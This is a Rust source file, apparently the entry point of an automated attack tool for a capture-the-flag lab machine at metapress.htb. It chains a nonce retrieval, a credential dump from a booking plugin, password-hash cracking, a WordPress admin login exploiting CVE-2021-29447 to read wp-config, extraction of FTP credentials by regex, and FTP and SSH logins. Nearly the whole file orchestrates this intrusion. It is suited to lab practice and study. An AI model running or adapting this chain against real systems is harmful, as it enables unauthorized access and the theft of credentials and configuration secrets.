use std::os::unix::raw::off_t;
use std::process::exit;
use std::ptr::copy_nonoverlapping;
use std::time::Duration;
use reqwest::*;
use crate::booking::{Booking, Credentials};
use log::{info, error, LevelFilter};
use regex::Regex;
use simple_logger::SimpleLogger;
use crate::cracker::cracker;
use crate::errors::MyError;
use warp::Filter;
use crate::sftp::FTPServer;
use crate::sshClient::SSHClient;
use crate::wave::Wave;

mod errors;

mod booking;
mod cracker;
mod wave;
mod warpserver;
mod sftp;
mod sshClient;

const BASE_URL: &str = "metapress.htb";

pub struct FTPCredentials {
    pub ftp_username: String,
    pub ftp_password: String,
}

#[tokio::main]
async fn main() {

    SimpleLogger::new().with_level(LevelFilter::Info).init().unwrap();

    let http_timeout = Duration::from_secs(7);
    let http_client = Client::builder().timeout(http_timeout).build().expect("client build error");

    //Step 1.1: to retrieve nonce.

    let booking = Booking::new(http_client.clone(), BASE_URL.clone());
    let retrieved = booking.retrieve_nonce().await;

    let mut nonce: Option<String> = None;
    if let Some(retrieved_nonce) = retrieved.ok() {
        info!("nonce retrieved: {}", retrieved_nonce);
        nonce = Some(retrieved_nonce);
    } else {
        error!("nonce not found. Exit.");
        exit(0);
    }

    //Step 1.2: to dump credentials from nonce.
    let credentials = booking.dump_credentials(nonce.clone().unwrap()).await;
    match credentials {
        Ok(ref credentials) => {
            info!("credentials dumped successfully: {:?}", credentials);
        }
        Err(ref e) => {
            error!("dump credentials failed: {:?}", e);
        }
    }

    /*
     Step 1.3: to crack the password hash. Since we know (or I know) that the admin hash is uncrackable, and it takes time
     to crack the manager time. I just verify here if the hash and password are unchanged from the answer I got. If it changed
     then you have to run hashcat or john to get the password.
     */
    let manager_cred: Vec<_> = credentials.unwrap().into_iter()
        .filter(|credential| credential.name == "manager")
        .collect();

    let manager_hash = &manager_cred[0].password;
    let mut password = "".to_string();
    let verified = cracker(manager_hash);
    if let Some(result) = verified.ok() {
        password = result.clone();
        info!("password for manager is: {}", result);
    } else {
        error!("password crack failed. Good luck with hashcat");
    }

    //Step 2: hack into the admin panel and continue exploiting through CVE-2021-29447.
    //let proxy = reqwest::Proxy::http("127.0.0.1:8080");
    let http_client = Client::builder().timeout(http_timeout).redirect(reqwest::redirect::Policy::none()).cookie_store(true).build().expect("client build error");
    let wave = Wave::new(http_client, BASE_URL, password);
    let wp_config = wave.exploit().await;
    //dbg!(wp_config.clone());

    //Step 3: ftp into the server and get the credentials for further ssh

    //Step 3.1: regex the credentials needed for ftp.

    let user_re = Regex::new(r"FTP_USER', '(?<u>\S+)'").unwrap();
    let pass_re = Regex::new(r"FTP_PASS', '(?<p>\S+)'").unwrap();

    let ftp_username = &user_re.captures(&*wp_config).expect("ftp_username extract failed. Should not happen.")["u"].to_string();
    let ftp_password = &pass_re.captures(&*wp_config).expect("ftp_password extract failed. Should not happen.")["p"].to_string();
    //dbg!(ftp_password);
    //dbg!(ftp_username);

    let ftp_credentials = FTPCredentials {
        ftp_username: ftp_username.to_owned(),
        ftp_password: ftp_password.to_owned()
    };

    //Step 3.2: get the credentials from ftp
    let ftp_url = format!("{}:21", BASE_URL);
    let mut ftp_server = FTPServer::build(ftp_url, ftp_credentials);

    let ssh_credentials = ftp_server.extract();

    //Step 4: ssh into the box
    SSHClient::build(ssh_credentials, BASE_URL.to_string()).await;








}
